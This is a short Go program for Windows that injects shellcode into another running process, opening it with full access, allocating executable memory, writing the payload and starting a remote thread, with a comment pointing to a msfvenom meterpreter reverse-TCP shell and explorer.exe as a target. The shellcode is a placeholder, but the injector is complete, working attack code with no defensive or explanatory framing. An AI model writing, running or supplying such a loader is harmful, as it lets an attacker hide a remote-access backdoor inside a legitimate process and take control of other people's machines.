package main

import (
    "encoding/hex"
    "fmt"
    "syscall"
    "unsafe"
)

const (
    PROCESS_ALL_ACCESS = 0x1F0FFF
    MEM_COMMIT         = 0x1000
    MEM_RESERVE        = 0x2000
    PAGE_EXECUTE_READWRITE = 0x40
)

var (
    kernel32       = syscall.NewLazyDLL("kernel32.dll")
    procOpenProcess  = kernel32.NewProc("OpenProcess")
    procVirtualAllocEx = kernel32.NewProc("VirtualAllocEx")
    procWriteProcessMemory = kernel32.NewProc("WriteProcessMemory")
    procCreateRemoteThread = kernel32.NewProc("CreateRemoteThread")
)

func main() {
    // Shellcode to be injected (e.g., msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=... LPORT=...)
    shellcodeHex := "YOUR_SHELLCODE_HERE"
    shellcode, _ := hex.DecodeString(shellcodeHex)

    // PID of the target process (e.g., explorer.exe)
    pid := 1234

    // Open the target process
    pHandle, _, _ := procOpenProcess.Call(PROCESS_ALL_ACCESS, 0, uintptr(pid))
    if pHandle == 0 {
        fmt.Println("Failed to open process.")
        return
    }

    // Allocate memory in the remote process
    addr, _, _ := procVirtualAllocEx.Call(pHandle, 0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    if addr == 0 {
        fmt.Println("Failed to allocate memory.")
        return
    }

    // Write the shellcode to the allocated memory
    var bytesWritten uintptr
    procWriteProcessMemory.Call(pHandle, addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), (uintptr)(unsafe.Pointer(&bytesWritten)))

    // Create a remote thread to execute the shellcode
    procCreateRemoteThread.Call(pHandle, 0, 0, addr, 0, 0, 0)
}
